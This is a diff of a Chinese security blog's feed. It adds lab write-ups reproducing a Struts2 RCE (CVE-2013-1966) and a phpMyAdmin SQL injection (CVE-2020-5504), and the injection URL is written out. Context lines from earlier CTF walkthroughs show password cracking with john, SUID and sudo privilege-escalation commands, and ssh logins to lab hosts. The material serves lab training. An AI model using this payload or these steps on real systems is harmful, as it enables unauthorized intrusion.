@@ -3,18 +3,62 @@
     <id>https://ch1e.gitee.io</id>
     <title>ch1e的随笔 • Posts by &#34;web安全&#34; tag</title>
     <link href="https://ch1e.gitee.io" />
-    <updated>2021-10-13T12:51:37.820Z</updated>
+    <updated>2021-10-21T06:42:56.655Z</updated>
+    <category term="CTF" />
     <category term="靶场练习" />
     <category term="web安全" />
-    <category term="CTF" />
     <category term="免杀" />
     <category term="渗透测试" />
-    <category term="C++" />
     <category term="数据库" />
     <category term="代码审计" />
+    <category term="C++" />
+    <category term="漏洞复现" />
+    <category term="SQL注入" />
     <category term="红队钓鱼" />
+    <category term="远程代码执行" />
     <category term="内网渗透" />
     <category term="网络协议" />
+    <entry>
+        <id>https://ch1e.gitee.io/2021/10/21/st-013/</id>
+        <title>Struts2-013RCE漏洞复现(CVE-2013-1966)</title>
+        <link rel="alternate" href="https://ch1e.gitee.io/2021/10/21/st-013/"/>
+        <content type="html">&lt;h1 id=&#34;Struts2-013RCE漏洞复现-CVE-2013-1966&#34;&gt;&lt;a href=&#34;#Struts2-013RCE漏洞复现-CVE-2013-1966&#34; class=&#34;headerlink&#34; title=&#34;Struts2-013RCE漏洞复现(CVE-2013-1966)&#34;&gt;&lt;/a&gt;Struts2-013RCE漏洞复现(CVE-2013-1966)&lt;/h1&gt;&lt;h1 id=&#34;影响版本&#34;&gt;&lt;a href=&#34;#影响版本&#34; class=&#34;headerlink&#34; title=&#34;影响版本&#34;&gt;&lt;/a&gt;&lt;strong&gt;影响版本&lt;/strong&gt;&lt;/h1&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Apache Group Struts 2.0.0 - 2.3.14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h1 id=&#34;漏洞描述&#34;&gt;&lt;a href=&#34;#漏洞描述&#34; class=&#34;headerlink&#34; title=&#34;漏洞描述&#34;&gt;&lt;/a&gt;漏洞描述&lt;/h1&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;CVE(CAN) ID: CVE-2013-1966&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Struts2 是第二代基于Model-View-Controller (MVC)模型的java企业级web应用框架。它是WebWork和Struts社区合并后的产物。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Apache Struts2的s:a和s:url标签都提供了一个includeParams属性。此属性允许使用的值包括none、get、all。当该属性被设置为get或all时，Apache Struts2会将用户提交的参数值作为Ognl表达式执行。攻击者可以提交带有恶意的Ongl表达式，达到执行任意Java代码的目的。只要基于Apache Struts2开发的JSP代码中使用了url/a标签并且设置了includeParams属性为all或get，远程攻击者即可利用此漏执行任意命令。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;复现地址:&lt;a href=&#34;http://vulfocus.fofa.so/&#34;&gt;http://vulfocus.fofa.so/&lt;/a&gt;&lt;/p&gt;
+&lt;h1 id=&#34;漏洞复现&#34;&gt;&lt;a href=&#34;#漏洞复现&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现&#34;&gt;&lt;/a&gt;漏洞复现&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/ZwqGG/image/main/img/image-20211021144502977.png&#34; alt=&#34;image-20211021144502977&#34;&gt;&lt;/p&gt;
+&lt;p&gt;访问首页，点击”s:a”tag   &lt;a href=&#34;http://118.193.36.37:48931/link.action&#34;&gt;http://118.193.36.37:48931/link.action&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;直接使用Exp吧&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/ZwqGG/image/main/img/image-20211021144618353.png&#34; alt=&#34;image-20211021144618353&#34;&gt;&lt;/p&gt;
+</content>
+        <category term="靶场练习" />
+        <category term="web安全" />
+        <category term="漏洞复现" />
+        <category term="远程代码执行" />
+        <updated>2021-10-21T06:42:56.655Z</updated>
+    </entry>
+    <entry>
+        <id>https://ch1e.gitee.io/2021/10/21/phpmyadmin1/</id>
+        <title>phpmyadmin 后台sql注入漏洞复现（CVE-2020-5504）</title>
+        <link rel="alternate" href="https://ch1e.gitee.io/2021/10/21/phpmyadmin1/"/>
+        <content type="html">&lt;h1 id=&#34;phpmyadmin-后台sql注入漏洞复现（CVE-2020-5504）&#34;&gt;&lt;a href=&#34;#phpmyadmin-后台sql注入漏洞复现（CVE-2020-5504）&#34; class=&#34;headerlink&#34; title=&#34;phpmyadmin 后台sql注入漏洞复现（CVE-2020-5504）&#34;&gt;&lt;/a&gt;phpmyadmin 后台sql注入漏洞复现（CVE-2020-5504）&lt;/h1&gt;&lt;h1 id=&#34;影响版本&#34;&gt;&lt;a href=&#34;#影响版本&#34; class=&#34;headerlink&#34; title=&#34;影响版本&#34;&gt;&lt;/a&gt;&lt;strong&gt;影响版本&lt;/strong&gt;&lt;/h1&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Phpmyadmin &amp;lt;= 5.00&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Phpmyadmin &amp;lt;= 4.94&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h1 id=&#34;漏洞复现&#34;&gt;&lt;a href=&#34;#漏洞复现&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现&#34;&gt;&lt;/a&gt;&lt;strong&gt;漏洞复现&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;复现地址:&lt;a href=&#34;http://vulfocus.fofa.so/&#34;&gt;http://vulfocus.fofa.so/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211021141143985.png&#34; alt=&#34;image-20211021141143985&#34;&gt;&lt;/p&gt;
+&lt;p&gt;拿到环境使用给出的账号密码进入后台，开启Burpsuite抓包，获取到一个token，保存下来&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211021141220287.png&#34; alt=&#34;image-20211021141220287&#34;&gt;&lt;/p&gt;
+&lt;p&gt;直接将请求的地址替换成poc即可。poc如下，记得需要替换token&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;server_privileges.php?ajax_request=true&amp;amp;validate_username=1&amp;amp;username=1&amp;#x27;and extractvalue(1,concat(0x7e,(select user()),0x7e))--+db=&amp;amp;token=3c7c5b2b7f3a7621394d6c733e35705f&amp;amp;viewing_mode=server&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211021141407302.png&#34; alt=&#34;image-20211021141407302&#34;&gt;&lt;/p&gt;
+</content>
+        <category term="靶场练习" />
+        <category term="web安全" />
+        <category term="漏洞复现" />
+        <category term="SQL注入" />
+        <updated>2021-10-21T06:10:08.079Z</updated>
+    </entry>
     <entry>
         <id>https://ch1e.gitee.io/2021/10/13/ATT&amp;CK1/</id>
         <title>ATT&amp;CK实战系列—红队实战（一）</title>
@@ -152,7 +196,7 @@
 &lt;p&gt;额，我这里数据库连接不上，这第一个flag暂时找不出来，因为爆破账号密码的话，正确密码在数据库里&lt;/p&gt;
 &lt;h2 id=&#34;后渗透提权&#34;&gt;&lt;a href=&#34;#后渗透提权&#34; class=&#34;headerlink&#34; title=&#34;后渗透提权&#34;&gt;&lt;/a&gt;后渗透提权&lt;/h2&gt;&lt;p&gt;虽然第一个flag做不出来，第二个还是可以的，我们可以发现在/drupal/misc有个tyrell.pass，里面有tyrell的账号密码&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210824113603240.png&#34; alt=&#34;image-20210824113603240&#34;&gt;&lt;/p&gt;
-&lt;p&gt;使用ssh登陆  ssh &lt;a href=&#34;mailto:&amp;#116;&amp;#121;&amp;#x72;&amp;#x65;&amp;#108;&amp;#108;&amp;#64;&amp;#x31;&amp;#x39;&amp;#x32;&amp;#46;&amp;#49;&amp;#54;&amp;#x38;&amp;#46;&amp;#49;&amp;#x36;&amp;#57;&amp;#x2e;&amp;#49;&amp;#x34;&amp;#x33;&#34;&gt;&amp;#116;&amp;#121;&amp;#x72;&amp;#x65;&amp;#108;&amp;#108;&amp;#64;&amp;#x31;&amp;#x39;&amp;#x32;&amp;#46;&amp;#49;&amp;#54;&amp;#x38;&amp;#46;&amp;#49;&amp;#x36;&amp;#57;&amp;#x2e;&amp;#49;&amp;#x34;&amp;#x33;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;使用ssh登陆  ssh &lt;a href=&#34;mailto:&amp;#116;&amp;#121;&amp;#114;&amp;#x65;&amp;#x6c;&amp;#108;&amp;#x40;&amp;#x31;&amp;#x39;&amp;#50;&amp;#46;&amp;#x31;&amp;#54;&amp;#56;&amp;#46;&amp;#49;&amp;#x36;&amp;#x39;&amp;#46;&amp;#x31;&amp;#x34;&amp;#51;&#34;&gt;&amp;#116;&amp;#121;&amp;#114;&amp;#x65;&amp;#x6c;&amp;#108;&amp;#x40;&amp;#x31;&amp;#x39;&amp;#50;&amp;#46;&amp;#x31;&amp;#54;&amp;#56;&amp;#46;&amp;#49;&amp;#x36;&amp;#x39;&amp;#46;&amp;#x31;&amp;#x34;&amp;#51;&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;登录成功之后使用sudo -l命令发现/bin/journalctl可以进行利用；&lt;br&gt;附上漏洞查询连接&lt;code&gt;https://gtfobins.github.io/&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210824113659688.png&#34; alt=&#34;image-20210824113659688&#34;&gt;&lt;/p&gt;
 &lt;p&gt;输入完命令即可获取root权限&lt;/p&gt;
@@ -184,7 +228,7 @@
 &lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210823111649441.png&#34; alt=&#34;image-20210823111649441&#34;&gt;&lt;/p&gt;
 &lt;p&gt;user.cap里是一些包信息 ，使用aircrack-ng爆破，爆破得到 ESSID 的名字 blackjax KEY snowflake&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210823112110327.png&#34; alt=&#34;image-20210823112110327&#34;&gt;&lt;/p&gt;
-&lt;p&gt;然后登陆ssh  ssh -p 2525 &lt;a href=&#34;mailto:&amp;#98;&amp;#x6c;&amp;#97;&amp;#x63;&amp;#x6b;&amp;#x6a;&amp;#x61;&amp;#x78;&amp;#x40;&amp;#49;&amp;#57;&amp;#50;&amp;#x2e;&amp;#49;&amp;#54;&amp;#56;&amp;#46;&amp;#x31;&amp;#54;&amp;#57;&amp;#x2e;&amp;#x31;&amp;#52;&amp;#x32;&#34;&gt;&amp;#98;&amp;#x6c;&amp;#97;&amp;#x63;&amp;#x6b;&amp;#x6a;&amp;#x61;&amp;#x78;&amp;#x40;&amp;#49;&amp;#57;&amp;#50;&amp;#x2e;&amp;#49;&amp;#54;&amp;#56;&amp;#46;&amp;#x31;&amp;#54;&amp;#57;&amp;#x2e;&amp;#x31;&amp;#52;&amp;#x32;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;然后登陆ssh  ssh -p 2525 &lt;a href=&#34;mailto:&amp;#x62;&amp;#x6c;&amp;#x61;&amp;#x63;&amp;#107;&amp;#106;&amp;#97;&amp;#x78;&amp;#64;&amp;#x31;&amp;#57;&amp;#50;&amp;#46;&amp;#49;&amp;#54;&amp;#x38;&amp;#46;&amp;#x31;&amp;#x36;&amp;#57;&amp;#x2e;&amp;#x31;&amp;#52;&amp;#50;&#34;&gt;&amp;#x62;&amp;#x6c;&amp;#x61;&amp;#x63;&amp;#107;&amp;#106;&amp;#97;&amp;#x78;&amp;#64;&amp;#x31;&amp;#57;&amp;#50;&amp;#46;&amp;#49;&amp;#54;&amp;#x38;&amp;#46;&amp;#x31;&amp;#x36;&amp;#57;&amp;#x2e;&amp;#x31;&amp;#52;&amp;#50;&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210823112153470.png&#34; alt=&#34;image-20210823112153470&#34;&gt;&lt;/p&gt;
 &lt;h2 id=&#34;后渗透提权&#34;&gt;&lt;a href=&#34;#后渗透提权&#34; class=&#34;headerlink&#34; title=&#34;后渗透提权&#34;&gt;&lt;/a&gt;后渗透提权&lt;/h2&gt;&lt;p&gt;我们这里使用suid提权，首先查找具有suid的文件&lt;/p&gt;
 &lt;p&gt;find / -perm -u=s -type f 2&amp;gt;/dev/null&lt;/p&gt;
@@ -239,7 +283,7 @@
 &lt;p&gt;我们来解密试试，这里把我们要解密的东西丢到一个文件里，然后使用john解密，字典在/var/share/wordlists/下，rockyou.txt，首次使用需要进行解压，解压命令 gzip -d rockyou.txt.gz&lt;/p&gt;
 &lt;p&gt;破解命令  john –format=md5crypt –wordlist=/usr/share/wordlists/rockyou.txt 666  这里666是自己创建的文件的名字&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210822124451419.png&#34; alt=&#34;image-20210822124451419&#34;&gt;&lt;/p&gt;
-&lt;p&gt;我们这里就直接知道了flag的账号密码，可以ssh登陆,ssh &lt;a href=&#34;mailto:&amp;#102;&amp;#x6c;&amp;#97;&amp;#103;&amp;#64;&amp;#49;&amp;#57;&amp;#50;&amp;#x2e;&amp;#x31;&amp;#54;&amp;#x38;&amp;#x2e;&amp;#x31;&amp;#x36;&amp;#57;&amp;#46;&amp;#x31;&amp;#52;&amp;#49;&#34;&gt;&amp;#102;&amp;#x6c;&amp;#97;&amp;#103;&amp;#64;&amp;#49;&amp;#57;&amp;#50;&amp;#x2e;&amp;#x31;&amp;#54;&amp;#x38;&amp;#x2e;&amp;#x31;&amp;#x36;&amp;#57;&amp;#46;&amp;#x31;&amp;#52;&amp;#49;&lt;/a&gt;,登陆成功&lt;/p&gt;
+&lt;p&gt;我们这里就直接知道了flag的账号密码，可以ssh登陆,ssh &lt;a href=&#34;mailto:&amp;#102;&amp;#108;&amp;#x61;&amp;#103;&amp;#64;&amp;#x31;&amp;#x39;&amp;#x32;&amp;#46;&amp;#x31;&amp;#54;&amp;#x38;&amp;#46;&amp;#x31;&amp;#x36;&amp;#57;&amp;#x2e;&amp;#x31;&amp;#x34;&amp;#49;&#34;&gt;&amp;#102;&amp;#108;&amp;#x61;&amp;#103;&amp;#64;&amp;#x31;&amp;#x39;&amp;#x32;&amp;#46;&amp;#x31;&amp;#54;&amp;#x38;&amp;#46;&amp;#x31;&amp;#x36;&amp;#57;&amp;#x2e;&amp;#x31;&amp;#x34;&amp;#49;&lt;/a&gt;,登陆成功&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210822124654454.png&#34; alt=&#34;image-20210822124654454&#34;&gt;&lt;/p&gt;
 &lt;h2 id=&#34;后渗透提权&#34;&gt;&lt;a href=&#34;#后渗透提权&#34; class=&#34;headerlink&#34; title=&#34;后渗透提权&#34;&gt;&lt;/a&gt;后渗透提权&lt;/h2&gt;&lt;p&gt;我们可以查看一下存在的用户,cat /etc/passwd|grep bash,顺便切换成bash&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210822124951829.png&#34; alt=&#34;image-20210822124951829&#34;&gt;&lt;/p&gt;
@@ -794,7 +838,7 @@
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ctfshow&amp;#123;42986bfd-0cba-43c6-9be4-1a319be86d20&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 
 &lt;h1 id=&#34;web15&#34;&gt;&lt;a href=&#34;#web15&#34; class=&#34;headerlink&#34; title=&#34;web15&#34;&gt;&lt;/a&gt;web15&lt;/h1&gt;&lt;p&gt;公开的信息比如邮箱，可能造成信息泄露，产生严重后果&lt;/p&gt;
-&lt;p&gt;可以看到有一个邮箱&lt;a href=&#34;mailto:&amp;#x31;&amp;#49;&amp;#x35;&amp;#x36;&amp;#x36;&amp;#51;&amp;#49;&amp;#57;&amp;#x36;&amp;#x31;&amp;#64;&amp;#x71;&amp;#113;&amp;#46;&amp;#99;&amp;#111;&amp;#x6d;&#34;&gt;&amp;#x31;&amp;#49;&amp;#x35;&amp;#x36;&amp;#x36;&amp;#51;&amp;#49;&amp;#57;&amp;#x36;&amp;#x31;&amp;#64;&amp;#x71;&amp;#113;&amp;#46;&amp;#99;&amp;#111;&amp;#x6d;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;可以看到有一个邮箱&lt;a href=&#34;mailto:&amp;#49;&amp;#x31;&amp;#53;&amp;#54;&amp;#x36;&amp;#x33;&amp;#x31;&amp;#x39;&amp;#54;&amp;#49;&amp;#x40;&amp;#x71;&amp;#x71;&amp;#x2e;&amp;#x63;&amp;#111;&amp;#x6d;&#34;&gt;&amp;#49;&amp;#x31;&amp;#53;&amp;#54;&amp;#x36;&amp;#x33;&amp;#x31;&amp;#x39;&amp;#54;&amp;#49;&amp;#x40;&amp;#x71;&amp;#x71;&amp;#x2e;&amp;#x63;&amp;#111;&amp;#x6d;&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;访问admin页面，admin作为账号 ，邮箱作为密码，发现不对&lt;/p&gt;
 &lt;p&gt;点忘记密码让我们填密保问题所在地  我们查一下这个qq，发现qq的资料显示在西安   之后密码被重置为admin7789，登陆即可&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ctfshow&amp;#123;dd71f776-6d6a-4cde-9106-f8db89f56b8d&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
@@ -1171,9 +1215,9 @@
 &lt;p&gt;post：v1=hex2bin&lt;/p&gt;
 &lt;p&gt;然后访问1.php去触发就可以了&lt;/p&gt;
 </content>
+        <category term="CTF" />
         <category term="靶场练习" />
         <category term="web安全" />
-        <category term="CTF" />
         <updated>2021-07-23T09:39:00.596Z</updated>
     </entry>
     <entry>
@@ -1318,9 +1362,9 @@
 &lt;p&gt;压缩源文件目录区：&lt;br&gt;50 4B 01 02：目录中文件文件头标记(0x02014b50)&lt;br&gt;3F 00：压缩使用的 pkware 版本&lt;br&gt;14 00：解压文件所需 pkware 版本&lt;br&gt;00 00：全局方式位标记（有无加密的重要标志，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）&lt;br&gt;08 00：压缩方式&lt;br&gt;5A 7E：最后修改文件时间&lt;br&gt;F7 46：最后修改文件日期&lt;br&gt;16 B5 80 14：CRC-32校验（1480B516）&lt;br&gt;19 00 00 00：压缩后尺寸（25）&lt;br&gt;17 00 00 00：未压缩尺寸（23）&lt;br&gt;07 00：文件名长度&lt;br&gt;24 00：扩展字段长度&lt;br&gt;00 00：文件注释长度&lt;br&gt;00 00：磁盘开始号&lt;br&gt;00 00：内部文件属性&lt;br&gt;20 00 00 00：外部文件属性&lt;br&gt;00 00 00 00：局部头部偏移量&lt;br&gt;6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001&lt;/p&gt;
 &lt;p&gt;压缩源文件目录结束标志：&lt;br&gt;50 4B 05 06：目录结束标记&lt;br&gt;00 00：当前磁盘编号&lt;br&gt;00 00：目录区开始磁盘编号&lt;br&gt;01 00：本磁盘上纪录总数&lt;br&gt;01 00：目录区中纪录总数&lt;br&gt;59 00 00 00：目录区尺寸大小&lt;br&gt;3E 00 00 00：目录区对第一张磁盘的偏移量&lt;br&gt;00 00：ZIP 文件注释长度&lt;br&gt;————————————————&lt;br&gt;以上内容转自CSDN，原文链接：&lt;a href=&#34;https://blog.csdn.net/weixin_41687289/article/details/82695801&#34;&gt;https://blog.csdn.net/weixin_41687289/article/details/82695801&lt;/a&gt;&lt;/p&gt;
 &lt;h2 id=&#34;REVERSE&#34;&gt;&lt;a href=&#34;#REVERSE&#34; class=&#34;headerlink&#34; title=&#34;REVERSE&#34;&gt;&lt;/a&gt;REVERSE&lt;/h2&gt;&lt;h2 id=&#34;CRYPTO&#34;&gt;&lt;a href=&#34;#CRYPTO&#34; class=&#34;headerlink&#34; title=&#34;CRYPTO&#34;&gt;&lt;/a&gt;CRYPTO&lt;/h2&gt;&lt;h2 id=&#34;PWN&#34;&gt;&lt;a href=&#34;#PWN&#34; class=&#34;headerlink&#34; title=&#34;PWN&#34;&gt;&lt;/a&gt;PWN&lt;/h2&gt;</content>
+        <category term="CTF" />
         <category term="靶场练习" />
         <category term="web安全" />
-        <category term="CTF" />
         <updated>2021-07-22T04:01:41.978Z</updated>
     </entry>
     <entry>
@@ -1511,9 +1555,9 @@
 
 &lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/articles/web/192052.html&#34;&gt;无需sendmail：巧用LD_PRELOAD突破disable_functions&lt;/a&gt;&lt;/p&gt;
 </content>
+        <category term="CTF" />
         <category term="靶场练习" />
         <category term="web安全" />
-        <category term="CTF" />
         <updated>2021-07-14T10:05:03.593Z</updated>
     </entry>
     <entry>
